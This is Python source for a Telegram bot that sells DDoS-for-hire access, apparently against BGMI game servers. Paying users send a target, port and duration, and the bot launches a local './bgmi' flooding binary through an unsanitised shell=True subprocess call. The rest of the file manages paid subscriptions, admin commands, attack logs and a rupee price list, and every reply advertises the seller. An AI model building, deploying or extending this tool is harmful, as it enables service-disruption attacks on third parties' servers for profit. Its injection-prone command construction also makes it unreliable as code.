# script by @TMZEROO

import telebot
import subprocess
import datetime
import os
import threading
import time  # Added to handle periodic task execution
from keep_alive import keep_alive

keep_alive()

# insert your Telegram bot token here
bot = telebot.TeleBot('YOUR BOT TOKEN')

# Admin user IDs
admin_id = ["YOUR ADMIN ID"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Dictionary to track active attacks
active_attacks = {}

# Lock for thread safety when managing active attacks
attack_lock = threading.Lock()

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ‚ùå."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ‚úÖ"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} üëç."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists ü§¶‚Äç‚ôÇÔ∏è."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add üòò."
    else:
        response = "You have not purchased yet purchase now from:- @Gopal58‚úÖ."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"üë§ Your Info:\n\nüÜî User ID: <code>{user_id}</code>\nüìù Username: {username}\nüîñ Role: {user_role}\nüìÖ Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n‚è≥ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")

# Command handler to remove a user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully üëç."
            else:
                response = f"User {user_to_remove} not found in the list ‚ùå."
        else:
            response = '''Please Specify A User ID to Remove. 
‚úÖ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @Gopal58‚úÖ üôá."

    bot.reply_to(message, response)

# Command handler to clear logs
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ‚ùå."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ‚úÖ"
        except FileNotFoundError:
            response = "Logs are already cleared ‚ùå."
    else:
        response = "You have not purchased yet purchase now from :- @Gopal58‚úÖ ‚ùÑ."
    bot.reply_to(message, response)

# Command handler to clear users
@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ‚ùå."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ‚úÖ"
        except FileNotFoundError:
            response = "users are already cleared ‚ùå."
    else:
        response = "Íú∞ Ä·¥á·¥á ·¥ã·¥á ·¥Ö ú·¥Ä Ä·¥ç Íú± ú·¥Ä ü·¥Ä  ú·¥Ä…™ ·¥ã è·¥Ä ·¥ä·¥è ·¥ç·¥ú ·¥ú·¥õ·¥õ ú·¥Ä ·¥ã·¥Ä…™ ·¥ã ú…™  ô ú…™ …¢·¥úÍú±  Ä ú·¥Ä…™  ú·¥è  ô·¥ú è ·¥ã Ä·¥è Íú∞ Ä·¥á·¥á ·¥ç·¥Ä…™ ·¥ã·¥ú·¥Ñ ú …¥ ú…™ ·¥ç…™ ü·¥õ·¥Ä  ô·¥ú è:- @Gopal58‚úÖ üôá."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ‚ùå"
        except FileNotFoundError:
            response = "No data found ‚ùå"
    else:
        response = "Íú∞ Ä·¥á·¥á ·¥ã·¥á ·¥Ö ú·¥Ä Ä·¥ç Íú± ú·¥Ä ü·¥Ä  ú·¥Ä…™ ·¥ã è·¥Ä ·¥ä·¥è ·¥ç·¥ú ·¥ú·¥õ·¥õ ú·¥Ä ·¥ã·¥Ä…™ ·¥ã ú…™  ô ú…™ …¢·¥úÍú±  Ä ú·¥Ä…™  ú·¥è  ô·¥ú è ·¥ã Ä·¥è Íú∞ Ä·¥á·¥á ·¥ç·¥Ä…™ ·¥ã·¥ú·¥Ñ ú …¥ ú…™ ·¥ç…™ ü·¥õ·¥Ä  ô·¥ú è:- @Gopal58‚úÖ ‚ùÑ."
    bot.reply_to(message, response)

# Command handler to show recent logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ‚ùå."
                bot.reply_to(message, response)
        else:
            response = "No data found ‚ùå"
            bot.reply_to(message, response)
    else:
        response = "Íú∞ Ä·¥á·¥á ·¥ã·¥á ·¥Ö ú·¥Ä Ä·¥ç Íú± ú·¥Ä ü·¥Ä  ú·¥Ä…™ ·¥ã è·¥Ä ·¥ä·¥è ·¥ç·¥ú ·¥ú·¥õ·¥õ ú·¥Ä ·¥ã·¥Ä…™ ·¥ã ú…™  ô ú…™ …¢·¥úÍú±  Ä ú·¥Ä…™  ú·¥è  ô·¥ú è ·¥ã Ä·¥è Íú∞ Ä·¥á·¥á ·¥ç·¥Ä…™ ·¥ã·¥ú·¥Ñ ú …¥ ú…™ ·¥ç…™ ü·¥õ·¥Ä  ô·¥ú è:- @Gopal58‚úÖ ‚ùÑ."
        bot.reply_to(message, response)

# New function to periodically send the "Bot is active" message every 5 minutes
def send_periodic_message():
    while True:
        for user_id in allowed_user_ids:
            try:
                bot.send_message(user_id, '''Dear DDOS users !

Important Notice For You ...

If you do not share your feedback with us, then we will be forced to close the group access and give personal access to whoever provides the feedback üö®

REGARDS - @Gopal58‚úÖ''')
            except Exception as e:
                print(f"Failed to send message to {user_id}: {e}")
        time.sleep(300)  # Wait 5 minutes before sending the message again

# Start the periodic message in a separate thread
threading.Thread(target=send_periodic_message).start()

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, ùêÄùêìùêìùêÄùêÇùêä ùêíùêìùêÄùêëùêìùêÑùêÉ.üî•üî•\n\nùêìùêöùê´ùê†ùêûùê≠: {target}\nùêèùê®ùê´ùê≠: {port}\nùêìùê¢ùê¶ùêû: {time} ùêíùêûùêúùê®ùêßùêùùê¨\nùêåùêûùê≠ùê°ùê®ùêù: VIP- User of @Gopal58‚úÖ"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 0

# Function to handle the start of an attack
def start_attack(user_id, target, port, time):
    with attack_lock:
        if len(active_attacks.get(user_id, [])) >= 2:
            return False, "You have reached the maximum number of simultaneous attacks (5)."

        active_attacks.setdefault(user_id, []).append(target)

    try:
        # Simulate attack execution (original logic here)
        full_command = f"./bgmi {target} {port} {time} 30"
        process = subprocess.run(full_command, shell=True)
        response = f"Brother enjoy üëå. Target: {target} Port: {port} Time: {time}"
        return True, response
    finally:
        with attack_lock:
            active_attacks[user_id].remove(target)

# New function to run attack in a thread and notify upon completion
def run_attack_and_notify(message, user_id, target, port, time):
    success, response = start_attack(user_id, target, port, time)
    if success:
        bot.reply_to(message, "Attack finished " + response)
        bot.reply_to(message, " ‚ú® I AM FREE NOW üôÇ For Using type /bgmi")

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown ‚ùå. Please Wait 10sec Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 180:
                response = "Error: Time interval must be less than 180."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                
                # Immediate response after attack initiation
                username = message.from_user.username if message.from_user.username else message.from_user.first_name
                attack_start_message = (
                    f"{username}, ùêÄùê≠ùê≠ùêöùêúùê§ ùêíùêÆùêúùêúùêûùê¨ùê¨ùêüùêÆùê•ùê•ùê≤ ùêíùê≠ùêöùê´ùê≠ùêûùêù üòÅ‚ô•Ô∏è\n\n"
                    f"ùêìùêöùê´ùê†ùêûùê≠: {target}\n"
                    f"ùêèùê®ùê´ùê≠: {port}\n"
                    f"ùêìùê¢ùê¶ùêû: {time} ùêíùêûùêúùê®ùêßùêùùê¨\n"
                    f"ùêåùêûùê≠ùê°ùê®ùêù: VIP- User of :- @Gopal58‚úÖ."
                )
                bot.reply_to(message, attack_start_message)  # Send the attack initiation message
                
                # Run the attack in a separate thread to allow the bot to respond immediately
                threading.Thread(target=run_attack_and_notify, args=(message, user_id, target, port, time)).start()

        else:
            response = "‚úÖ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = "üö´ Unauthorized Access! üö´\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @Gopal58‚úÖ"

    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "‚ùå No Command Logs Found For You ‚ùå."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command üò°."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''ü§ñ Available commands:
üí• /bgmi : Method For Bgmi Servers. 
üí• /rules : Please Check Before Use !!.
üí• /mylogs : To Check Your Recents Attacks.
üí• /plan : Checkout Our Botnet Rates.
üí• /myinfo : TO Check Your WHOLE INFO.

ü§ñ To See Admin Commands:
üí• /admincmd : Shows All Admin Commands.

Buy From :- @Gopal58‚úÖ'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''‚ùÑÔ∏è·¥°·¥á ü·¥Ñ·¥è·¥ç·¥á ·¥õ·¥è ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥Ö·¥Ö·¥ès  ô·¥è·¥õ, {user_name}! ·¥õ ú…™s …™s  ú…™…¢ ú «´·¥ú·¥Ä ü…™·¥õ è s·¥á Ä·¥†·¥á Ä  ô·¥Äs·¥á·¥Ö ·¥Ö·¥Ö·¥ès. ·¥õ·¥è …¢·¥á·¥õ ·¥Ä·¥Ñ·¥Ñ·¥áss.
ü§ñTry To Run This Command : /help 
‚úÖBUY :- @Gopal58‚úÖ'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ‚ö†Ô∏è:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip üåü :
-> Attack Time : 180 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 10

Pr-ice Listüí∏ :
Day-->150 Rs
Week-->550 Rs
Month-->1250 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

üí• /add <userId> : Add a User.
üí• /remove <userid> Remove a User.
üí• /allusers : Authorised Users Lists.
üí• /logs : All Users Logs.
üí• /broadcast : Broadcast a Message.
üí• /clearlogs : Clear The Logs File.
üí• /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "‚ö†Ô∏è Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users üëç."
        else:
            response = "ü§ñ Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command üò°."

    bot.reply_to(message, response)

# Start the bot polling
while True:
    try:
        bot.polling(none_stop=True, timeout=60)
    except Exception as e:
        print(e)